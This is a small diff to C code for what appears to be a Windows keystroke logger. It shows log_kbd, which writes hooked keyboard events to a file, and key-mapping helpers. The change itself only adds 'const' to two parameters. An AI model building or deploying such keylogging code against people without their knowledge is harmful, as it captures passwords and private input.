@@ -35,7 +35,7 @@ errno_t log_kbd(const KBDLLHOOKSTRUCT* kbd_hook)
 	return fclose(out_file);
 }
 
-BOOL is_ignored(DWORD vk_code) 
+BOOL is_ignored(const DWORD vk_code)
 {
 	switch (vk_code) {
 	case VK_LCONTROL:
@@ -47,7 +47,7 @@ BOOL is_ignored(DWORD vk_code)
 	}
 }
 
-LPCWSTR get_virtual_key_value(DWORD vk_code) 
+LPCWSTR get_virtual_key_value(const DWORD vk_code)
 {
 	switch (vk_code) {
 	case VK_RETURN:
